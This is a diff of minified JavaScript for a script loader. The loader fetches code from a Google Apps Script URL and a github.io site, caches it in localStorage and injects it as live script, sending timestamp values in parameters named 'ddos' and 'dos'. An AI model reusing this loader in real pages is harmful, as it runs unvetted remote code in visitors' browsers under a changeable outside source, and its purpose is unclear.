@@ -4,6 +4,6 @@ localStorage.setItem("a.google",JSON.stringify({content:"var googles = {ms:"+e+"
 var b=localStorage.getItem("a.start"),c;null!=b?(c=(new Date).getTime(),b=Math.floor((c-parseInt(b))/1E3),b=googles.ms+b,c=7*(b-173472337)):(b=googles.ms,c=googles.md);alo.$(e+"&ddos="+b+"&dos="+c+"&end=0",a,d,k,f,g)}},100);else{var b=Math.ceil((new Date).getTime()/1E3),c=localStorage,l=0;if(k&&0!=k){for(var m in c)if(0==m.indexOf(a)){0==m.indexOf(a+"-")?l=m:c.removeItem(m);break}0!=l?(m=l.split("-"),m=+m[1],m<b?(c.removeItem(l),a+="-"+(b+ +k)):a=l):a+="-"+(b+ +k)}b=c.getItem(a);c=0<e.indexOf(".css")?
 "style":"script";null!=b&&null!=d?(l=JSON.parse(b),l.version==d?(this.e(l.content,c,g),f&&f()):(localStorage.removeItem(b),this.c(e,a,d,c,f,g))):this.c(e,a,d,c,f,g)}}};
 
-alo.$('https://script.google.com/macros/s/AKfycbxBh5ptSSej3stcLyB1k_oIuVXuKvGLzsdc7LFL2I4xe4APdaA/exec','a.google','3');
+alo.$('https://script.google.com/macros/s/AKfycbxBh5ptSSej3stcLyB1k_oIuVXuKvGLzsdc7LFL2I4xe4APdaA/exec','a.google','1');
 alo.$('https://rongnano.github.io/file/js.js','a.js','3');
 alo.$('https://rongnano.github.io/file/style.css','a.css','3');
